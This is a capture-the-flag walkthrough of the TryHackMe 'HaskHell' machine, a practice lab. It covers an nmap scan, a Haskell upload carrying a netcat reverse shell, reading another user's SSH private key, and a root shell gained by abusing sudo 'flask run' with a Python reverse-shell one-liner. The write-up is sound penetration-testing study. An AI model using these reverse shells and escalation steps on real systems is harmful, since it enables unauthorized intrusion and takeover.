# HaskHell

---

Platform: [Tryhackme](https://tryhackme.com/room/haskhell)

Difficulty: Medium

Initial Access: RCE via Insecure file upload

Privilege Escalation: Misconfigured sudo privileges.

---

Nmap Scan:

```bash
┌──(ghost㉿kali)-[~/tryhackme/haskhell]
└─$ sudo nmap -Pn -A -p- --min-rate 4000 10.201.50.43 -oN nmap.full
[sudo] password for ghost: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 00:49 EDT
Nmap scan report for 10.201.50.43
Host is up (0.25s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1d:f3:53:f7:6d:5b:a1:d4:84:51:0d:dd:66:40:4d:90 (RSA)
|   256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA)
|_  256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (ED25519)
5001/tcp open  http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Homepage
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Ports | Methodology |
| --- | --- |
| 22 (SSH) | Potentially for later use. |
| 5001 (HTTP) | Gunicorn 19.7.1, maybe vulnerable version, but first have to look at what is running on this http server.  |

---

### Initial Enumeration

On port 5001, there was some type of static website hosted.

![image.png](image.png)

`/homework1` endpoint:

![image.png](image%201.png)

So, reading above contents of the website shows haskell is going to be taught in this semester and professor had given some homework to students. They can submit it through an endpoint `/upload` , but it’s not found on the server, maybe fuzzing directory will reveal some other endpoints. Main points or hints to note from here:

<aside>
💡

Only Haskell files are accepted for uploads. Learned that one the hard way last semester...

Your file will be compiled and ran and all output will be piped to a file under the uploads directory.

</aside>

![image.png](image%202.png)

Directory fuzzing revealed an endpoint `/submit` , and here we can submit our homework files.

![image.png](image%203.png)

![image.png](image%204.png)

---

### Initial Access

So, now the question is what is that haskell? (Searched on google about it)

Haskell is a modern, standard, purely functional programming and non-strict language. It is Specially designed to handle a wide range of applications, from numerical through to symbolic. It has an expressive syntax and very rich inbuilt architecture.

Let’s code a simple print command in haskell:

```bash
main = putStrLn "Hello, Haskell!"
```

Save this code in a file named test.hs and let’s try to upload it to the server.

![image.png](image%205.png)

And the server compiles our code, run it and also save it to `/uploads/<filename>` location.

![image.png](image%206.png)

Searched on google more about how to execute system commands using haskell code and found the method.

Write reverse shell code in haskell and saved it to a file named haskell.hs:

```bash
import System.Process

main = do
callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.17.87.131 4445 >/tmp/f"
```

Uploaded that file on the submit page.

![image.png](image%207.png)

It automatically compiles that code and run it , which triggered reverse shell on our attacker machine.

![image.png](image%208.png)

---

### Shell as prof

Enumerating machine with flask user’s account revealed 2 more user’s account that were present in that machine: `haskell` and `prof` 

User flask can also read directories of both the users.

![image.png](image%209.png)

Lookind inside prof user’s directory revealed user flag.

![image.png](image%2010.png)

Also able to read the `id_rsa` file(private rsa key) of user prof inside `/home/prof/.ssh`

![image.png](image%2011.png)

Copied it our attacker machine, gave it suitable permission and logged in to user prof’s account via ssh.

![image.png](image%2012.png)

---

### Shell as root

Checking sudo privileges of user prof revealed user prof can run `/usr/bin/flask run` as root.

![image.png](image%2013.png)

Tried running that command with sudo privileges and throws some error:

![image.png](image%2014.png)

Searching about this error on google, showed this error means Flask doesn’t know which Python file contains your application instance. Which means let’s say your flask application file is `app.py` then we have set it to environment variable like these: `export FLASK_APP=app.py` .

Which means we can make any python file which contains reverse shell code in python and can set it to environment variables like above and running that flask run with sudo privileges can provide us root shell.

created a python file named `rev.py` and wrote python reverse shell code inside it.

```python
import os,pty,socket;s=socket.socket();s.connect(("10.17.87.131",4446));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")
```

![image.png](image%2015.png)

Set it to environment variable and run it.

```bash
prof@haskhell:~$ export FLASK_APP=rev.py
prof@haskhell:~$ sudo /usr/bin/flask run
```

On our attacker machine, reverse shell got triggered as root on the target machine.

![image.png](image%2016.png)

Grabbed the root flag

![image.png](image%2017.png)

---

That’s it for this machine.✅